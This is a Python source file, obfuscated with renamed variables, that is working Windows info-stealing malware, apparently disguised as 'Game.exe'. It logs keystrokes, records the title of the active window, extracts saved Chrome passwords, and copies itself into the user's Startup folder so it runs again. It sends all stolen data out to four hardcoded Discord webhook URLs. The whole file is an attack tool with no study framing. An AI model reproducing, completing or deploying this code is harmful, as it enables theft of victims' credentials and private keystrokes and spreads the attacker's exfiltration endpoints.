from discord_webhook import DiscordWebhook ,DiscordEmbed #line:1
from pynput .keyboard import Key ,Listener #line:2
import threading #line:3
import chromepass #line:4
import win32gui #line:5
import getpass #line:6
import time #line:7
import os #line:8
import shutil #line:9
from pathlib import Path #line:10
global keylog ,lim ,tab ,crpass ,filenameforexe #line:12
crpass =chromepass .Chromepass ()#line:13
keylog =""#line:14
filenameforexe ="Game.exe"#line:15
lim =1500 #line:16
LURL ="https://discordapp.com/api/webhooks/943519508172271616/UG2YEOsES-_ikgttoELx9iJusTeWRI-RWUtZiI7ZW0nYqN-CshCg1tnmSU21mIMIzE-b"#line:17
LURL2 ="https://discordapp.com/api/webhooks/943844790578077706/TG6gl6I05ay4NMtRXSvBEulSwDE4XIaVt56bmduzmMpTZqx_ZW4H_S9ZLt9eH5Xn0ulD"#line:18
LURL3 ="https://discordapp.com/api/webhooks/943845676301844510/iI1lbmwJOWrfO2uminNWV159rbORIaURWR7rTTmgHKkc0-wnpat7zXCJjZKqEecLawfh"#line:19
LURL4 ="https://discordapp.com/api/webhooks/943857139741515836/49Lpj3Hq5e22A-nQSIl6B9wxIi_OmJJNCZ22N_tUlPI_wkrmcyxTpAErGswyUD16S1eM"#line:20
LNAME =getpass .getuser ()#line:21
tab =""#line:22
def send (O00OO0O000OOOOOOO ,OO0000OO00O00O0O0 )->None :#line:25
    OOO0OOO0000OO00OO =DiscordWebhook (url =OO0000OO00O00O0O0 ,content =O00OO0O000OOOOOOO ,username =LNAME )#line:26
    OOO0OOO0000OO00OO .execute ()#line:27
def logging (OOOO00OOO000OO0O0 ):#line:29
    OOO00000O00O00OOO =time .localtime ()#line:30
    OOOO00OOO000OO0O0 =f"{OOOO00OOO000OO0O0} | {OOO00000O00O00OOO.tm_year}/{OOO00000O00O00OOO.tm_mon}/{OOO00000O00O00OOO.tm_mday} {OOO00000O00O00OOO.tm_hour}:{OOO00000O00O00OOO.tm_min}:{OOO00000O00O00OOO.tm_sec}"#line:31
    send (OOOO00OOO000OO0O0 ,LURL3 )#line:32
def on_press (O00000O0OOO0O0000 ):#line:34
    global keylog ,lim #line:35
    try :#line:36
        if len (keylog )<lim :#line:37
            keylog =keylog +"."+str (O00000O0OOO0O0000 ).replace ("'","")#line:38
        elif len (keylog )>=lim :#line:39
            send (keylog ,LURL )#line:40
            logging ("SUCCESS | KeyLogging is send")#line:41
            keylog =""#line:42
    except :#line:43
        logging ("ERROR | KeyLogging is Fail")#line:44
def listener_c ():#line:47
    with Listener (on_press =on_press )as OO0O00OO000O000OO :#line:48
        OO0O00OO000O000OO .join ()#line:49
def startup ():#line:51
    global filenameforexe #line:52
    OOO0000OOOO0OO000 =f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"#line:53
    OO000O00OO00O00OO =str (Path .cwd ())+"\\"+filenameforexe #line:54
    if os .path .isdir (OOO0000OOOO0OO000 ):#line:55
        try :#line:56
            shutil .copy (OO000O00OO00O00OO ,OOO0000OOOO0OO000 )#line:57
            logging (f"SUCCESS | copy_move {OO000O00OO00O00OO} -> {OOO0000OOOO0OO000}"+"\\")#line:58
        except :#line:59
            logging (f"ERROR | copy_move {OO000O00OO00O00OO} -> {OOO0000OOOO0OO000} is fail")#line:60
    else :#line:61
        logging (f"FAIL | copy_move {OO000O00OO00O00OO} -> {OOO0000OOOO0OO000} is fail cause dir isn't there")#line:62
def Tab ():#line:64
    global tab #line:65
    try :#line:66
        if tab !=win32gui .GetWindowText (win32gui .GetForegroundWindow ()):#line:67
            tab =win32gui .GetWindowText (win32gui .GetForegroundWindow ())#line:68
            send (tab ,LURL2 )#line:69
    except :#line:70
        logging ("ERROR | TabLogging is Fail")#line:71
def whiling ():#line:73
    while True :#line:74
        Tab ()#line:75
def Chromepass ():#line:77
    global crpass #line:78
    try :#line:79
        OO00O00O0O0OOO000 =crpass .get_passwords ()#line:80
        if OO00O00O0O0OOO000 !=[]:#line:81
            for OO0O0OO0O0O0O00O0 in OO00O00O0O0OOO000 :#line:82
                send (OO0O0OO0O0O0O00O0 ,LURL4 )#line:83
        elif OO00O00O0O0OOO000 ==[]:#line:84
            logging ("FAIL | Chromepass hasn't content (empty)")#line:85
        else :#line:86
            logging ("FAIL | Chromepass is somethin worng")#line:87
    except :#line:88
        logging ("ERROR | Chromepass is Fail")#line:89
def main ():#line:91
    startup ()#line:92
    Chromepass ()#line:93
    threading .Thread (target =listener_c ).start ()#line:94
    threading .Thread (target =whiling ).start ()#line:95
main ()#line:97